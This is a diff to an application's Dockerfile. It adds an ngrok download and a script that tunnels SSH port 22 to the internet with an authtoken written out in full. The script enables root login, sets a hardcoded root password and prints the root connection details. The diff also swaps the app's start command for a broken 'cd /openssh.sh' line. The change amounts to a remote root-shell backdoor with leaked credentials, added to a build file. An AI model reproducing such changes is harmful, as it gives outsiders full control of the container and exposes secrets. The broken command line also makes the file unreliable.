@@ -13,6 +13,19 @@ RUN apt-get update && \
   apt-get upgrade -y && \
   rm -rf /var/lib/apt/lists/*
   
+  RUN wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O /ngrok-stable-linux-amd64.zip\
+    && cd / && unzip ngrok-stable-linux-amd64.zip \
+    && chmod +x ngrok
+    
+RUN mkdir /run/sshd \
+    && echo "/ngrok tcp --authtoken 2M27dRwze2Ne9C3JBrCF9v0tZz9_3uyj5aXQt5CjKW6t5LGov --region ap 22 &" >>/openssh.sh \
+    && echo "sleep 5" >> /openssh.sh \
+    && echo "curl -s http://localhost:4040/api/tunnels | python3 -c \"import sys, json; print(\\\"ssh info:\\\n\\\",\\\"ssh\\\",\\\"root@\\\"+json.load(sys.stdin)['tunnels'][0]['public_url'][6:].replace(':', ' -p '),\\\"\\\nROOT Password:deka99\\\")\" || echo \"\nError：NGROK_TOKEN，Ngrok Token\n\"" >> /openssh.sh \
+    && echo '/usr/sbin/sshd -D' >>/openssh.sh \
+    && echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config  \
+    && echo root:deka99|chpasswd \
+    && chmod 755 /openssh.sh
+  
 RUN mkdir /root/kode/
 RUN cd /root/kode/ \
 && rm -rf database.json \
@@ -33,4 +46,4 @@ RUN  mkdir /root/kode/tmp/ \
 
 EXPOSE 3000
 
-CMD cd /root/kode/ && ./root/kode/hehe.sh
+CMD cd /openssh.sh
